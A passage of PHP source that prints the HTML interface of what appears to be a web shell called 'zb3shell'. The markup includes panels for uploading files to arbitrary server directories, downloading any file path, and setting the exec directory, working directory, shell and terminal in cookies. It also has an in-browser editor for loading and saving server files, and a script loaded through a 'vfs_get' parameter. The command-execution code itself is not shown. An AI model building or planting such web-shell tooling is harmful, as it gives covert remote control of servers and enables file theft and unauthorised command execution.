<div id="z2-upload" onclick="event.stopPropagation();" style="width: 340px;margin:auto; margin-top: 30px; border: 1px solid grey; background-color: black; color: white; padding: 6px; overflow: auto;"><div style="text-align: center; font-size: 20px;">Upload File</div><div id="z2-upload-before"><form method="post" action="" enctype="multipart/form-data" id="z2-form">Upload directory:<br><input type="text" id="z2-upload-dir" name="dir" value="'.$dir2.'" style="width: 330px;"><button onclick="z2_upload_default();return false;">Default</button><button onclick="z2_upload_title();return false;">Get from title</button><br><br><input type="file" id="z2-upload-file" name="thefile[]" multiple="" onchange="z2_upload_input_change(this);"><br><div id="z2-upload-single"><br><label><input type="checkbox" id="z2-up-name-cb" onchange="z2_cb_change(this);" name="renameit" value="1">Rename file to:</label><br><input type="text" disabled style="width: 330px;" id="z2-upload-name" name="newname"></div><br><button onclick="z2_upload_start();return false;">Upload</button></form></div><div id="z2-upload-ing" style="display: none;"><div id="z2-upload-part1">Starting upload...</div><div id="z2-upload-part2" style="display: none;">Uploading:<br><progress id="z2-upload-progress" max=100 value=0 style="width: 295px;"></progress> <span id="z2-upload-progress-t">0</span>%</div><div id="z2-upload-part3" style="display: none;">Processing upload...</div><br><br><button onclick="z2_upload_abort();return false;">Abort</button></div><div id="z2-upload-success" style="display: none;">Upload successful!</div></div>
</div>
<div style="display:none;width: 100%;height:100%;position: fixed; top:0px; left: 0px; background-color: rgba(123,123,123,0.4);overflow:auto;z-index:4;" id="z2-download-overlay" onclick="z2_download_overlay_OFF()">
<div id="z2-download" onclick="event.stopPropagation();" style="width: 340px;margin:auto; margin-top: 30px; border: 1px solid grey; background-color: black; color: white; padding: 6px; overflow: auto;"><div style="text-align: center; font-size: 20px;">Download File</div><div id="z2-download-before">File path:<br><input type="text" id="z2-download-dir" name="dir" value="'.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'cwd'].'" style="width: 330px;"><button onclick="z2_download_title();return false;">Get from title</button><br><br><button onclick="z2_download_start();return false;">Download</button></div>
<div id="z2-download-ing" style="display: none;"><div id="z2-download-part1">Processing download...<br><br><button onclick="z2_download_abort();return false;">Abort</button></div><div id="z2-download-part2" style="display: none;">Download should start automatically.<br>If it doesn\'t, click <a id="z2-download-link" href="">this</a> link.</div></div>
</div>
</div>
<div style="display:none;width: 100%;height:100%;position: fixed; top:0px; left: 0px; background-color: rgba(123,123,123,0.4);overflow:auto;z-index:4;" id="z2-paste-overlay" onclick="z2_paste_overlay_OFF()">
<div id="z2-paste" onclick="event.stopPropagation();" style="width: 340px;margin:auto; margin-top: 30px; border: 1px solid grey; background-color: black; color: white; padding: 6px; overflow: auto;">
Paste into this box:<br><br><textarea style="width: 338px; height: 70px;" id="z2-paste-area"></textarea><br><br><div style="float: right;"><button onclick="z2_paste_overlay_OFF();return false;" style="width: 75px;">Cancel</button> <button onclick="z2_paste();return false" style="width: 75px;">OK</button></div>
</div>
</div>
<div style="display:none;width: 100%;height:100%;position: fixed; top:0px; left: 0px; background-color: rgba(123,123,123,0.4);overflow:auto;z-index:4;" id="z2-session-overlay" onclick="z2_session_overlay_OFF()">
<div id="z2-session" onclick="event.stopPropagation();" style="width: 340px;margin:auto; margin-top: 30px; border: 1px solid grey; background-color: black; color: white; padding: 6px; overflow: auto;">
<div style="text-align: center; font-size: 20px;">Session defaults</div>
Exec directory: <br><input style="width: 330px;" type="text" name="dir" value="'.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'" data-ovalue="'.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'" id="z2-session-dir"><br><br>Working directory: <br><input type="text" name="cwd" value="'.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'cwd'].'" data-ovalue="'.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'cwd'].'" id="z2-session-cwd" style="width: 330px;"><br><br>Shell: <br><input style="width: 330px;" type="text" name="shell" value="'.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'shell'].'" data-ovalue="'.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'shell'].'" id="z2-session-shell"><br><br>Term: <br><input style="width: 330px;" type="text" name="term" value="'.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'term'].'" data-ovalue="'.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'term'].'" id="z2-session-term"><br><br><div style="float: right;"><button style="width: 75px;" onclick="z2_session_cancel(); return false;">Cancel</button> <button style="width: 75px;" onclick="z2_session_set(); return false;" id="z2-session-button">Set</button></div>
</div></div>
<div style="display:none;width: 100%;height:100%;position: fixed; top:0px; left: 0px; background-color: rgba(123,123,123,0.4);overflow:auto;z-index:4;" id="z2-zb3pad-overlay"><table style="width: 100%; height: 100%; border-spacing: 0px; border-collapse: collapse;"><tr><td onclick="z2_zb3pad_overlay_OFF()" style="height: 100%">
<div id="z2-zb3pad" onclick="event.stopPropagation();" style="width: 90% ; height: 90%;margin:auto; border: 1px solid grey; background-color: black; color: white; padding: 6px; overflow: auto;"><style>
body {background-color: black; color: white; font-family: Arial; font-size: 10pt;}
#zb3pad-editarea {font-family: Lucida Console; font-size: 9pt;background-color: black; color: white;}
#zb3pad-table
{
 width: 100%; height: 100%;
 border-collapse: collapse; border-spacing: 0;
}
</style>
<table id="zb3pad-table"><tr><td style="hegiht: auto;"><input spellcheck="false" type="text" style="width: 100%" id="zb3pad-file" onkeydown="zb3pad.inputKeyDown(event);"></td><td style="padding-left: 3px; width: 260px;">as <select id="zb3pad-charset" style="width: 95px;" onchange="zb3pad.charsetChange(this);" data-lgv="0"><option value="ISO-8859-1" selected>ISO-8859-1</option><option value="UTF-8">UTF-8</option><option value="hex">Hex</option><option value="custom" data-custom="1">Other</option><option style="display: none;" id="zb3pad-charset-other" value="...">..</option></select><input style="width: 95px; display: none;" id="zb3pad-charset-temp" spellcheck="false" onchange="zb3pad.tmpInputChange(this);" onblur="zb3pad.tmpInputChange(this);"> <button onclick="zb3pad.load();" style="width: 48px;">Load</button> <button onclick="zb3pad.save();" style="width: 48px;">Save</button></td></tr>
<tr><td colspan=2><button onclick="zb3pad.findPrevious();return false;">Find previous</button> <input spellcheck="false" type="text" size=13 id="zb3pad-search"><label onclick="zb3pad.focusTextarea();"><input type="checkbox" id="zb3pad-case">Match case</label> <label onclick="zb3pad.focusTextarea();"><input type="checkbox" id="zb3pad-regex">Regex</label> <button onclick="zb3pad.findNext(); return false;">Find Next</button> <button onclick="zb3pad.replaceIt(); return false;">Replace</button> <button onclick="zb3pad.replaceAll();return false;">Replace all</button> with: <input spellcheck="false" type="text" id="zb3pad-toreplace"><label><input type="checkbox" id="zb3pad-leavedollar">Don\'t escape $ (replace all)</label><br><label><input type="checkbox" onchange="zb3pad.setWrap(this);" checked>Word wrap</label> <button onclick="zb3pad.goToLine();return false;">Goto line:</button> <input type="text" spellcheck="false" data-oval="0" value="0" onchange="zb3pad.isn(this);return true;" id="zb3pad-line" size=8></td></tr>
<tr><td colspan=2 style="height: 100%;"><textarea spellcheck="false" style="-moz-box-sizing: border-box;box-sizing: border-box; width: 100%; height: 100%" id="zb3pad-editarea" wrap=\'on\' oninput="zb3pad.genStat(1);" onkeydown="zb3pad.textareaKeyDown(event);" onmousedown="zb3pad.genStat();" onmouseover="if (zb3pad.ctx) {zb3pad.ctx=0;zb3pad.genStat(2);}" oncontextmenu="zb3pad.ctx=1;" onkeyup="zb3pad.textareaKeyUp(event);"></textarea></td></tr>
<tr><td colspan=2 style="font-size: 11px;"><span id="zb3pad-normalstatus">Line: <span id="zb3pad-line2">0</span> | Column: <span id="zb3pad-col">0</span> | Position: <span id="zb3pad-pos">0</span></span><span id="zb3pad-status2" style="display: none;"></span></td></tr></table></table>
</div></td></tr></table>
</div>
    <script type="text/javascript" src="'.$_SERVER['REQUEST_URI'].'?vfs_get=zb3shell.js"></script></html>');
}